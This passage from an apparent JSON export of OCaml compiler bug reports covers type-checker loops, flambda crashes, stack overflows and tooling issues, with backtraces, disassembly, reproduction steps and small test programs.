4034bc:       48 89 70 08             mov    QWORD PTR [rax+0x8],rsi\r\n  4034c0:       48 8d 70 18             lea    rsi,[rax+0x18]\r\n  4034c4:       48 c7 46 f8 00 08 00    mov    QWORD PTR [rsi-0x8],0x800\r\n  4034cb:       00 \r\n  4034cc:       48 89 06                mov    QWORD PTR [rsi],rax\r\n  4034cf:       48 89 5e 08             mov    QWORD PTR [rsi+0x8],rbx\r\n  4034d3:       48 89 f8                mov    rax,rdi\r\n  4034d6:       48 89 f3                mov    rbx,rsi\r\n  4034d9:       eb 8d                   jmp    403468 <camlTest__break_things_1012+0x8>\r\n  4034db:       e8 f0 b0 01 00          call   41e5d0 <caml_call_gc>\r\n  4034e0:       eb b4                   jmp    403496 <camlTest__break_things_1012+0x36>\r\n  4034e2:       e8 dd b4 01 00          call   41e9c4 <caml_ml_array_bound_error>\r\n  4034e7:       66 0f 1f 84 00 00 00    nop    WORD PTR [rax+rax*1+0x0]\r\n  4034ee:       00 00 \r\n\r\ncaml_frametable:\r\n0x62dd90:\t0x00000000004034e0\t0x0003000700030010\r\n0x62dda0:\t0x0000000000000005\r\n==> retaddr = 0x4034e0, frame_size=0x10, num_live=3, live_ofs={7, 3, 5}\r\n==> translates to registers 3, 1, 2 = rsi, rbx, rdi\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7305\n**Reporter:** @avsm\n**Assigned to:** @garrigue\n**Status:** closed (set by @xavierleroy on 2017-09-24T15:33:17Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** crash\n**Version:** 4.03.0\n**Fixed in version:** 4.04.0 +dev / +beta1 / +beta2\n**Category:** typing\n\n## Bug description\n\nWhen compiling Cohttp (which uses -principal, but several of its dependent libraries do not), the type checker goes into an infinite loop:\r\n\r\n    frame #44: 0x00000001001a4351 ocamlc.opt`camlList__iter_1258 + 33\r\n    frame #45: 0x00000001001a4351 ocamlc.opt`camlList__iter_1258 + 33\r\n    frame #46: 0x00000001001a4351 ocamlc.opt`camlList__iter_1258 + 33\r\n    frame #47: 0x00000001000823c3 ocamlc.opt`camlBtype__iter_type_expr_5283 + 387\r\n    frame #48: 0x00000001000c1802 ocamlc.opt`camlCtype__closed_schema_rec_39833 + 306\r\n    frame #49: 0x00000001001a4351 ocamlc.opt`camlList__iter_1258 + 33\r\n    frame #50: 0x00000001000823c3 ocamlc.opt`camlBtype__iter_type_expr_5283 + 387\r\n    frame #51: 0x00000001000c1802 ocamlc.opt`camlCtype__closed_schema_rec_39833 + 306\r\n    frame #52: 0x00000001001a4351 ocamlc.opt`camlList__iter_1258 + 33\r\n    frame #53: 0x00000001001a4351 ocamlc.opt`camlList__iter_1258 + 33\r\n    frame #54: 0x00000001000822c4 ocamlc.opt`camlBtype__iter_type_expr_5283 + 132\r\n    frame #55: 0x00000001000823c3 ocamlc.opt`camlBtype__iter_type_expr_5283 + 387\r\n    frame #56: 0x00000001000c1802 ocamlc.opt`camlCtype__closed_schema_rec_39833 + 306\r\n    frame #57: 0x00000001001a4351 ocamlc.opt`camlList__iter_1258 + 33\r\n    frame #58: 0x00000001000823c3 ocamlc.opt`camlBtype__iter_type_expr_5283 + 387\r\n    frame #59: 0x00000001000c1802 ocamlc.opt`camlCtype__closed_schema_rec_39833 + 306\r\n    frame #60: 0x00000001001a4351 ocamlc.opt`camlList__iter_1258 + 33\r\n    frame #61: 0x00000001001a4351 ocamlc.opt`camlList__iter_1258 + 33\r\n    frame #62: 0x00000001000823c3 ocamlc.opt`camlBtype__iter_type_expr_5283 + 387\r\n    frame #63: 0x00000001000c1802 ocamlc.opt`camlCtype__closed_schema_rec_39833 + 306\r\n    frame #64: 0x00000001001a4351 ocamlc.opt`camlList__iter_1258 + 33\r\n    frame #65: 0x00000001000823c3 ocamlc.opt`camlBtype__iter_type_expr_5283 + 387\r\n    frame #66: 0x00000001000c1802 ocamlc.opt`camlCtype__closed_schema_rec_39833 + 306\r\n    frame #67: 0x00000001001a4351 ocamlc.opt`camlList__iter_1258 + 33\r\n    frame #68: 0x00000001000c198b ocamlc.opt`camlCtype__closed_schema_39842 + 123\r\n    frame #69: 0x00000001001467f1 ocamlc.opt`camlTypemod__check_nongen_scheme_9977 + 49\r\n    frame #70: 0x00000001001a4351 ocamlc.opt`camlList__iter_1258 + 33\r\n    frame #71: 0x000000010014911b ocamlc.opt`camlTypemod__type_implementation_15412 + 1099\r\n    frame #72: 0x0000000100027345 ocamlc.opt`camlTimings__time_1383 + 37\r\n    frame #73: 0x000000010001c169 ocamlc.opt`camlCompile__implementation_1807 + 569\r\n    frame #74: 0x0000000100004e1b ocamlc.opt`camlMain__process_implementation_file_1555 + 43\r\n    frame #75: 0x00000001001c978f ocamlc.opt`camlArg__parse_argv_dynamic_1326 + 1087\r\n    frame #76: 0x00000001001c9961 ocamlc.opt`camlArg__parse_2381 + 257\r\n    frame #77: 0x000000010000604e ocamlc.opt`camlMain__main_2319 + 110\r\n    frame #78: 0x0000000100027345 ocamlc.opt`camlTimings__time_1383 + 37\r\n    frame #79: 0x00000001000074db ocamlc.opt`camlMain__entry + 4315\r\n    frame #80: 0x0000000100001889 ocamlc.opt`caml_program + 1961\r\n    frame #81: 0x00000001001fd960 ocamlc.opt`caml_start_program + 92\r\n    frame #82: 0x00000001001e7ef7 ocamlc.opt`caml_main + 483\r\n    frame #83: 0x00000001001e7f3d ocamlc.opt`main + 12\r\n    frame #84: 0x00007fff942735ad libdyld.dylib`start + 1\r\n\r\nIt compiles fine when -principal is removed\n\n## Steps to reproduce\n\nopam install js_of_ocaml cohttp\r\nopam source cohttp\r\ncd <sourcedir>\r\nmake TESTS=--enable-tests\r\nlldb ocamlc.optprocess launch -- -verbose -principal -I /Users/avsm/.opam/system/lib/bytes -I /Users/avsm/.opam/system/lib/js_of_ocaml -I /Users/avsm/.opam/system/lib/lwt -I /Users/avsm/.opam/system/lib/stringext -I /Users/avsm/.opam/system/lib/sexplib -I /Users/avsm/.opam/system/lib/re -I /Users/avsm/.opam/system/lib/uri -I /Users/avsm/.opam/system/lib/fieldslib -I /Users/avsm/.opam/system/lib/base64 -I /Users/avsm/.opam/system/lib/cohttp -ppx /Users/avsm/.opam/system/lib/js_of_ocaml/./ppx_js -ppx ppx_lwt lib_test/test_xhr.ml\n"},{"labels":["bug"],"text":"**Original bug ID:** 7304\n**Reporter:** @mmottl\n**Assigned to:** @gasche\n**Status:** closed (set by @gasche on 2016-07-26T01:21:06Z)\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n**Monitored by:** @mmottl\n\n## Bug description\n\nThe following OCaml version is reported with OCaml 4.03.0+flambda in OPAM:\r\n\r\n  # ocaml --version\r\n  The OCaml toplevel, version 4.04.0+dev0-2016-02-18\r\n\r\nThis apparently causes problems with camlp4 (and dependent packages):\r\n\r\n  This version of Camlp4 is for OCaml 4.03 but you are using OCaml 4.04.0+dev0-2016-02-18.\r\n\r\nYou may want to report a version consistent with the OPAM package, possibly adding some FLambda indicator to the version information.\n"},{"labels":[null,"bug"],"text":"**Original bug ID:** 7302\n**Reporter:** @sliquister\n**Assigned to:** @lpw25\n**Status:** closed (set by @xavierleroy on 2017-09-24T15:33:13Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.03.0\n**Fixed in version:** 4.04.0 +dev / +beta1 / +beta2\n**Category:** back end (clambda to assembly)\n\n## Bug description\n\nocamlopt.opt can build the program [1] using very little stack space at 4.02.3; I can't even get it to overflow with ulimit -s 0.\r\nAt 4.03, it uses at least 5MB of stack (or whatever ulimit -s 5000 means), overflowing the stack [2] for programs that used to build just fine.\r\n\r\nLooking at the output of -dtypedtree, -dlambda, -rawlambda:\r\n$ ls -l d*\r\n 1.6M Jul 22 15:32 dlambda1\r\n  53K Jul 22 15:33 dlambda2\r\n 2.1M Jul 22 15:37 drawlambda1\r\n 105K Jul 22 15:40 drawlambda2\r\n  80K Jul 22 15:35 dtypedtree1\r\n  15K Jul 22 15:35 dtypedtree2\r\n1 is 4.03, 2 is 4.02.3.\r\nThe typedtree is the same (except in 4.03 it says things Tstr_modtype instead of Pstr_modtype, and the big backtrace at the end).\r\nThe lambda code, on the other hand, is much bigger with 4.03 and is probably what is making the backend blowup later. Where dlambda2 contains a bunch of aliases to modules like (global Core_kernel__Core_set!), dlambda1 seems to recurse through all the structure and alias only values at the leaves:\r\n (let (let/1551826 =a (global Core_kernel__Core_set!))\r\n   (makeblock 0 (field 0 let/1551826)\r\n     (field 1 (global Core_kernel__Core_set!))\r\n     (field 2 let/1551826) (field 3 let/1551826)\r\n     (field 4 let/1551826) (field 5 let/1551826)\r\n     (field 6 let/1551826) (field 7 let/1551826)\r\n     (field 8 let/1551826) (field 9 let/1551826)\r\n     (field 10 let/1551826) (field 11 let/1551826)\r\n     a bunch more lines\r\n\r\nThe code of core_kernel itself changed a bit during the switch to 4.03, but I don't think it could explain this.\r\n\r\n[1]\r\nmodule type S = sig\r\n  include module type of (struct\r\n    module Core_kernel = struct\r\n      module Std =\r\n        (Core_kernel.Std : module type of struct include Core_kernel.Std end\r\n         with module In_channel  := Core_kernel.Std.In_channel\r\n         with module Out_channel := Core_kernel.Std.Out_channel)\r\n    end\r\n    include Core_kernel.Std\r\n  end)\r\nend\r\nmodule Imports : S = struct\r\n  module Core_kernel = struct\r\n    module Std =\r\n      (Core_kernel.Std :\r\n         module type of struct include Core_kernel.Std end\r\n       with module In_channel  := Core_kernel.Std.In_channel\r\n       with module Out_channel := Core_kernel.Std.Out_channel)\r\n  end\r\n  include Core_kernel.Std\r\nend\r\n\r\n[2]\r\nFatal error: exception Stack overflow\r\nCalled from file \"map.ml\", line 110, characters 18-33\r\nCalled from file \"map.ml\", line 117, characters 21-33\r\nCalled from file \"map.ml\", line 114, characters 21-33\r\nCalled from file \"map.ml\", line 117, characters 21-33\r\nCalled from file \"map.ml\", line 117, characters 21-33\r\nCalled from file \"map.ml\", line 117, characters 21-33\r\nCalled from file \"asmcomp/CSEgen.ml\", line 53, characters 32-65\r\nCalled from file \"asmcomp/CSEgen.ml\", line 183, characters 22-61\r\nCalled from file \"asmcomp/CSEgen.ml\", line 323, characters 23-66\r\nCalled from file \"asmcomp/CSEgen.ml\", line 331, characters 24-42\r\nCalled from file \"asmcomp/CSEgen.ml\", line 324, characters 29-47\r\nCalled from file \"asmcomp/CSEgen.ml\", line 331, characters 24-42\r\nCalled from file \"asmcomp/CSEgen.ml\", line 324, characters 29-47\r\nCalled from file \"asmcomp/CSEgen.ml\", line 331, characters 24-42\r\nCalled from file \"asmcomp/CSEgen.ml\", line 324, characters 29-47\r\nCalled from file \"asmcomp/CSEgen.ml\", line 331, characters 24-42\r\nCalled from file \"asmcomp/CSEgen.ml\", line 324, characters 29-47\r\nCalled from file \"asmcomp/CSEgen.ml\", line 331, characters 24-42\r\nCalled from file \"asmcomp/CSEgen.ml\", line 324, characters 29-47\r\nCalled from file \"asmcomp/CSEgen.ml\", line 331, characters 24-42\r\nCalled from file \"asmcomp/CSEgen.ml\", line 324, characters 29-47\r\nCalled from file \"asmcomp/CSEgen.ml\", line 331, characters 24-42\r\nCalled from file \"asmcomp/CSEgen.ml\", line 324, characters 29-47\r\nCalled from file \"asmcomp/CSEgen.ml\", line 331, characters 24-42\r\nCalled from file \"asmcomp/CSEgen.ml\", line 324, characters 29-47\r\nCalled from file \"asmcomp/CSEgen.ml\", line 331, characters 24-42\r\nCalled from file \"asmcomp/CSEgen.ml\", line 324, characters 29-47\r\nCalled from file \"asmcomp/CSEgen.ml\", line 331, characters 24-42\r\nCalled from file \"asmcomp/CSEgen.ml\", line 324, characters 29-47\n"},{"labels":[null,"bug"],"text":"**Original bug ID:** 7301\n**Reporter:** @alainfrisch\n**Assigned to:** @mshinwell\n**Status:** closed (set by @xavierleroy on 2017-09-24T15:33:14Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** crash\n**Fixed in version:** 4.04.0 +dev / +beta1 / +beta2\n**Category:** back end (clambda to assembly)\n**Related to:** #7292\n**Monitored by:** braibant\n\n## Bug description\n\nThe following program compiled with flambda -O3 segfaults:\r\n\r\n<pre>\r\nlet foo () =\r\n  (fun xs0 () -> Lazy.force (List.hd xs0) ())\r\n    (List.map (fun g -> lazy g)\r\n       [Lazy.force (  lazy ( let _ = () in fun () -> ()  ) )]\r\n    )\r\n\r\nlet () =\r\n  let gen = foo () in\r\n  gen ();\r\n  Gc.compact ();\r\n  print_char 'A'; flush stdout;\r\n  gen ()\r\n</pre>\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7300\n**Reporter:** @damiendoligez\n**Assigned to:** @diml\n**Status:** closed (set by @xavierleroy on 2017-09-24T15:33:22Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.04.0 +dev / +beta1 / +beta2\n**Target version:** 4.04.0 +dev / +beta1 / +beta2\n**Fixed in version:** 4.04.0 +dev / +beta1 / +beta2\n**Category:** platform support (windows, cross-compilation, etc)\n**Monitored by:** @dra27\n\n## Bug description\n\nIn otherlibs/win32unix/sleep.c, the value `t` is accessed from the blocking section. The argument to `Sleep` should be computed outside the blocking section.\r\n\r\nSee https://github.com/ocaml/ocaml/pull/462#issuecomment-231745896\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7299\n**Reporter:** @damiendoligez\n**Assigned to:** @diml\n**Status:** closed (set by @xavierleroy on 2017-09-24T15:33:21Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.04.0 +dev / +beta1 / +beta2\n**Target version:** 4.04.0 +dev / +beta1 / +beta2\n**Fixed in version:** 4.04.0 +dev / +beta1 / +beta2\n**Category:** platform support (windows, cross-compilation, etc)\n**Monitored by:** @dra27\n\n## Bug description\n\nIn otherlibs/win32unix/readlink.c, function unix_readlink, the value of `opath` is accessed from the blocking section. It should first be copied outside the heap.\r\n\r\nSee https://github.com/ocaml/ocaml/pull/462#issuecomment-231713001\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7298\n**Reporter:** @lpw25\n**Assigned to:** @garrigue\n**Status:** resolved (set by @garrigue on 2016-10-20T02:27:46Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.04.0 +dev / +beta1 / +beta2\n**Target version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Fixed in version:** 4.04.0 +dev / +beta1 / +beta2\n**Category:** typing\n**Related to:** #7381\n\n## Bug description\n\nThe following code fails to type-check:\r\n\r\n  type t = T : t\r\n\r\n  module M : sig\r\n    type free = < bar : t -> unit; foo : free -> unit >\r\n  end = struct\r\n\r\n    class free = object (self : 'self)\r\n\r\n      method foo self = ()\r\n\r\n      method bar T =\r\n        self#foo self\r\n\r\n      end\r\n\r\n  end\r\n\r\nwith the error:\r\n\r\n  Error: Signature mismatch:\r\n       ...\r\n       Type declarations do not match:\r\n         type free =\r\n             < bar : t -> unit;\r\n               foo : (< bar : t -> unit; foo : 'a -> unit > as 'a) -> unit >\r\n       is not included in\r\n         type free = < bar : t -> unit; foo : free -> unit >\r\n\r\nbut if we use non-GADT syntax for the definition of [T] then there is no error.\r\n\r\nI'm not sure how exactly it is happening, but the issue is that one of the dummy_method fields is being duplicated and allowed to escape from the class definition.\r\n\r\n(This is similar to #7293 but different as this bug is still present on trunk)\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7297\n**Reporter:** @sliquister\n**Assigned to:** @garrigue\n**Status:** closed (set by @xavierleroy on 2017-09-24T15:33:16Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.03.0\n**Fixed in version:** 4.04.0 +dev / +beta1 / +beta2\n**Category:** typing\n**Monitored by:** @hcarty\n\n## Bug description\n\nBuilding:\r\n\r\nlet () = raise Exit; ()\r\n\r\nshould produce warning 21, but it only does when the compiler is not given -strict-sequence. The warning should be given regardless of the -strict-sequence flag.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7295\n**Reporter:** tormen\n**Assigned to:** @gasche\n**Status:** closed (set by @xavierleroy on 2017-09-24T15:33:13Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.02.3\n**Fixed in version:** later\n**Category:** -for ocamlbuild use https://github.com/ocaml/ocamlbuild/issues\n\n## Bug description\n\nNOT SURE IF THIS IS AN OCAMLBUILD or ocamlc problem... as I am quite new to the ocaml ecosystem, I let you figure that out if it's okey... (but I will hungrily consume any explanation about what category this bug should or should not be assigned to :)).\r\n\r\ninferred.mli tells me \r\n   val not_found : (unit -> 'a) -> bool and \r\nwhen I compile it complains about \r\n   val not_found : (unit -> unit) -> bool \r\nnot matching \r\n   val not_found : (unit -> 'a) -> bool\n\n## Steps to reproduce\n\n1.) foo.ml:\r\nlet not_found f = try f (); false with Not_found -> true\r\n\r\n2.) ocamlbuild -use-ocamlfind -pkg core -tag \"ppx(ppx-jane -as-ppx)\" -tag thread -tag debug -tag bin_annot -tag short_paths -tag safe_string -cflags \"-w +27@0..26-4@28..99-33-40-41-42-43-34-44\" -cflags -strict-sequence -cflags -safe-string -verbose 0 -Is  -use-ocamlfind -pkgs pgocaml,pgocaml.syntax,deriving,deriving-yojson.syntax,deriving-yojson,calendar -syntax camlp4o -tag thread foo.inferred.mli\r\n\r\n3.) cat _build/foo.inferred.mli:\r\nval not_found : (unit -> 'a) -> bool\r\n\r\n4.) cp _build/foo.inferred.mli foo.mli\r\n\r\n5.) ocamlbuild -use-ocamlfind -pkg core -tag \"ppx(ppx-jane -as-ppx)\" -tag thread -tag debug -tag bin_annot -tag short_paths -tag safe_string -cflags \"-w +27@0..26-4@28..99-33-40-41-42-43-34-44\" -cflags -strict-sequence -cflags -safe-string -verbose 0 -Is -use-ocamlfind -pkgs pgocaml,pgocaml.syntax,deriving,deriving-yojson.syntax,deriving-yojson,calendar -syntax camlp4o -tag thread foo.native\r\n\r\nShould yield:\r\nFile \"foo.ml\", line 1:\r\nError: The implementation foo.ml does not match the interface foo.cmi:\r\n       Values do not match:\r\n         val not_found : (unit -> unit) -> bool\r\n       is not included in\r\n         val not_found : (unit -> 'a) -> bool\r\n       File \"foo.ml\", line 2, characters 4-13: Actual declaration\r\nCommand exited with code 2.\n\n## Additional information\n\nSo IMHO (also myself looking at the code) the _build/foo.inferred.mli should have contained:\r\n         val not_found : (unit -> unit) -> bool\r\n\r\n(because \"f (); false\" means f () needs to evaluate to unit (because of the following \";\" and it certainly gets a unit input, so (unit -> unit) is correct.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7294\n**Reporter:** @alainfrisch\n**Assigned to:** @chambart\n**Status:** closed (set by @damiendoligez on 2016-10-26T15:00:34Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Target version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Fixed in version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Category:** tools (ocaml{lex,yacc,dep,debug,...})\n**Monitored by:** @gasche\n\n## Bug description\n\nThe function Export_info.print_approx is broken, which makes the output of ocamlobjinfo for .cmx produced with flambda incomplete.\r\n\r\nThis function maintains a queue of symbols to print.  The problem is that this queue is initially empty, so nothing is ever printed.\n\n## File attachments\n\n- [7294.diff](https://gist.githubusercontent.com/vicuna/5d956b06ed3995088177ea6f3d2defb4/raw/3c2b50bcb5624008300c0a4f47e0381369f14245/7294.diff)\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7293\n**Reporter:** @lpw25\n**Assigned to:** @garrigue\n**Status:** closed (set by @xavierleroy on 2017-09-24T15:33:12Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.03.0\n**Fixed in version:** 4.04.0 +dev / +beta1 / +beta2\n**Category:** typing\n**Monitored by:** @gasche\n\n## Bug description\n\nThe following code successfully type-checks:\r\n\r\n  type t = T : t\r\n\r\n  type s = S\r\n\r\n  class c = object (self : 'self)\r\n\r\n    method foo : s -> 'self = function\r\n      | S -> self#bar ()\r\n\r\n    method bar : unit -> 'self = fun () -> self\r\n\r\n  end\r\n\r\nbut if I rename the `S` variant to `T`:\r\n\r\n  type t = T : t\r\n\r\n  type s = T\r\n\r\n  class c = object (self : 'self)\r\n\r\n    method foo : s -> 'self = function\r\n      | T -> self#bar ()\r\n\r\n    method bar : unit -> 'self = fun () -> self\r\n\r\n  end\r\n\r\nthen I get an error:\r\n\r\n  Error: This expression has type < bar : unit -> 'a; foo : s -> 'a; .. > as 'a\r\n         but an expression was expected of type\r\n           < bar : unit -> 'a; foo : s -> 'a; .. > as 'a\r\n         Self type cannot escape its class\r\n\r\nThe problem is that in the second case we type-check the case using the GADT-enabled code path. This code-path includes a call to `correct_levels` on the expected type of the method:\r\n\r\n  if contains_gadt env pc_lhs then correct_levels ty_res\r\n\r\nThis call messes up the level of the `*dummy method*` field in the self type, leading to the spurious type error.\n"},{"labels":[null,"bug"],"text":"**Original bug ID:** 7292\n**Reporter:** @alainfrisch\n**Assigned to:** @mshinwell\n**Status:** closed (set by @xavierleroy on 2017-09-24T15:33:15Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Target version:** 4.04.0 +dev / +beta1 / +beta2\n**Fixed in version:** 4.04.0 +dev / +beta1 / +beta2\n**Category:** back end (clambda to assembly)\n**Related to:** #7301\n**Monitored by:** braibant\n\n## Bug description\n\nCompiling the following:\r\n\r\n<pre>\r\nlet _ = Lazy.force (lazy (fun _ -> assert false))\r\n</pre>\r\n\r\nwith flambda and O3 prints the following error message 9 times:\r\n\r\n<pre>\r\nFile \"camlinternalLazy.ml\", line 0, characters 0-0:\r\nWarning 59: A potential assignment to a non-mutable value was detected\r\nin this source file.  Such assignments may generate incorrect code\r\nwhen using Flambda.\r\n</pre>\r\n\r\n(Note that the error message refers to camlinternalLazy.ml while we are compiling another unit.)\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7291\n**Reporter:** @c-cube\n**Assigned to:** @mshinwell\n**Status:** closed (set by @damiendoligez on 2016-10-26T14:26:19Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** crash\n**Platform:** all?\n**OS:** archlinux 64 bits\n**Version:** 4.03.0\n**Target version:** 4.04.0 +dev / +beta1 / +beta2\n**Fixed in version:** 4.04.0 +dev / +beta1 / +beta2\n**Category:** middle end (typedtree to clambda)\n\n## Bug description\n\nA project of mine compiles fine on 4.03.0, but fails in 4.03.0+flambda with the following error:\r\n\r\n```\r\n>> Fatal error: When simplifying [Project_var], the closure ID subst/3626 in the approximation of the set of closures did not match the closure ID subst_partial_fun/3548 in the [Project_var] term.  Approximation: { descr=(closure:\r\nsubst/3626 from { descr=(set_of_closures:\r\nsubst/3626 invariant_params={ (param/3627 { }) } freshening={ vars_within_closure \r\n{ (id/3573 id/3625) }, closure_id { (subst/3574 subst/3626) } }) var=subst_set_of_closures/3632 symbol=<no symbol> }) var=subst/3636 symbol=<no symbol> }\r\n Var-within-closure being projected: subst_1967/3549\r\n\r\nFatal error: exception Misc.Fatal_error\r\n```\n\n## Steps to reproduce\n\n$ opam sw 4.03.0+flambda\r\n$ opam pin add -k git nunchaku https://github.com/nunchaku-inria/nunchaku.git#bug-flambda\r\n\r\n^\r\nit should fail during compilation of nunchaku itself. Sorry, the compilation is a bit long.\n\n## Additional information\n\nOpam files are attached (colored output enabled, use less -R).\n\n## File attachments\n\n- [opam-output.tar.gz](https://gist.githubusercontent.com/vicuna/42a874e81668adb320d22955b9180c11/raw/3b10f21353ea86f3b4a3446a861f514aed8d0840/opam-output.tar.gz)\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7290\n**Reporter:** @gasche\n**Assigned to:** @gasche\n**Status:** resolved (set by @gasche on 2016-07-29T05:13:07Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Target version:** 4.04.0 +dev / +beta1 / +beta2\n**Fixed in version:** 4.04.0 +dev / +beta1 / +beta2\n**Category:** ocamldoc\n**Has duplicate:** #7410\n**Monitored by:** @hcarty\n\n## Bug description\n\nocamldoc has not been updated to support inline record. This led to a manual build failure that has been fixed by octachron in https://github.com/ocaml/ocaml/pull/690 , but there probably still exists programs on which ocamldoc will fail with an assert failure.\r\n\r\noctachron expressed interest in working on this.\r\n\r\nI'm setting the target to 4.04+dev because having ocamldoc fail on existing language features may bite users down the road, so fixing this as soon as possible is preferable.\n"},{"labels":[null,"bug"],"text":"**Original bug ID:** 7289\n**Reporter:** ybarnoy\n**Assigned to:** @chambart\n**Status:** closed (set by @mshinwell on 2017-03-07T11:45:24Z)\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.03.0\n**Target version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Category:** back end (clambda to assembly)\n**Monitored by:** @gasche\n\n## Bug description\n\nWith 4.03+flambda, -O3, in\r\n\r\nlet _ =\r\n  let f = 100. in\r\n  let [@inline always] rec loop x  =\r\n    if x <= 0. then 0.\r\n    else loop (x -. 5.)\r\n  in\r\n  loop f\r\n\r\nI would expect x to be unboxed, but it isn't. Instead I get\r\n\r\n(function camlTest__loop_4 (x_6/1203: val)\r\n (if (<=f (load float64u x_6/1203) 0.) \"camlTest__const_float_39\"\r\n   (app{test.ml:5,9-23} \"camlTest__loop_4\"\r\n     (alloc 1277 (-f (load float64u x_6/1203) 5.)) val)))\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7288\n**Reporter:** tormen\n**Status:** closed (set by @damiendoligez on 2016-09-27T14:21:19Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Fixed in version:** 4.04.0 +dev / +beta1 / +beta2\n**Category:** documentation\n\n## Bug description\n\nAs Ocaml tends to be MINMAL in terms of functions in the std lib, I was a bit confused that there is List.flatten and List.concat.\r\n\r\nThis plus the fact that there was not ONLY written \"Same as concat\" for flatten made me wonder if they are in deed really 100% identical.\r\n\r\nTo effectively prevent such confusion I propose to simply remove the \r\n\" Not tail-recursive (length of the argument + length of the longest sub-list).\"\r\nand ONLY keep the sentence \"Same as concat.\" :)\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7287\n**Reporter:** Michael Soegtrop\n**Assigned to:** @gasche\n**Status:** closed (set by @xavierleroy on 2017-09-24T15:33:08Z)\n**Resolution:** won't fix\n**Priority:** normal\n**Severity:** minor\n**Platform:** Cygwin\n**OS:** Windows\n**OS Version:** 7\n**Version:** 4.02.3\n**Fixed in version:** undecided\n**Category:** -for ocamlbuild use https://github.com/ocaml/ocamlbuild/issues\n\n## Bug description\n\nDear Ocaml team,\r\n\r\nocambuild -show-tags gives strange warnings about package tags.\r\n\r\nI have this _tags file:\r\n\r\n<*> : package(str), package(Stdint)\r\n<*.ml> : warn(-23)\r\n\r\n$ ocamlbuild -show-tags CParser.mli\r\n\r\ngives the output shown below. To me the warnings about package tags don't make much sense. As far as I can tell from the documentation, using package tags is recommended to add external libraries and the syntax is correct. Also it works with these tags and it doesn't work without them.\r\n\r\nBest regards,\r\n\r\nMichael\r\n\r\ngives me:\r\n\r\nFile \"_tags\", line 1, characters 6-18:\r\nWarning: tag \"package\" does not expect a parameter, but is used with parameter \"str\"\r\nFile \"_tags\", line 1, characters 20-35:\r\nWarning: tag \"package\" does not expect a parameter, but is used with parameter \"Stdint\"\r\nFile \"_tags\", line 1, characters 20-35:\r\nWarning: the tag \"package(Stdint)\" is not used in any flag or dependency declaration, so it will have no effect; it may\r\nbe a typo. Otherwise you can use `mark_tag_used` in your myocamlbuild.ml to disable this warning.\r\nFile \"_tags\", line 1, characters 6-18:\r\nWarning: the tag \"package(str)\" is not used in any flag or dependency declaration, so it will have no effect; it may be\r\na typo. Otherwise you can use `mark_tag_used` in your myocamlbuild.ml to disable this warning.\r\nWarning: the following tags do not include dynamically-generated tags, such as link, compile, pack, byte, native, c, pdf\r\n... (this list is by no means exhaustive).\r\n\r\nTags for \"CParser.mli\":\r\n  {. extension:mli, file:CParser.mli, ocaml, package(Stdint), package(str),\r\n     quiet, traverse .}\r\nFinished, 0 targets (0 cached) in 00:00:00.\n\n## Steps to reproduce\n\nRun ocamlbuild -show-tags <somefile> with this _tags file:\r\n\r\n<*> : package(str), package(Stdint)\r\n<*.ml> : warn(-23)\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7286\n**Reporter:** mfp\n**Status:** closed (set by @xavierleroy on 2017-09-24T15:33:06Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.02.3\n**Fixed in version:** 4.03.0\n**Category:** otherlibs\n**Duplicate of:** #7013\n\n## Bug description\n\nI've been getting backtraces like the following on a program that uses\r\nEvent via Lwt_preemptive.detach:\r\n\r\n    Thread 1 killed on uncaught exception Invalid_argument(\"index out of bounds\")\r\n    Raised by primitive operation at file \"event.ml\", line 93, characters 4-20\r\n    Called from file \"src/preemptive/lwt_preemptive.ml\", line 79, characters 17-63\r\n    Called from file \"thread.ml\", line 37, characters 8-14\r\n\r\nThe exception is raised in a Lwt_preemptive worker thread that performs this operation:\r\n\r\n    let id, task = Event.sync (Event.receive worker.task_channel) in\r\n\r\n(BTW. Lwt_preemptive is moving away from Event because of #7158, but this separate\r\nissue stands.)\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7285\n**Reporter:** @lpw25\n**Assigned to:** @garrigue\n**Status:** closed (set by @xavierleroy on 2017-09-24T15:33:06Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.03.0\n**Fixed in version:** 4.04.0 +dev / +beta1 / +beta2\n**Category:** typing\n**Tags:** testsuite, typing\n**Monitored by:** @bobzhang @gasche @hcarty\n\n## Bug description\n\nIn principal mode `generalize_structure` is used for contravariant variables. However, 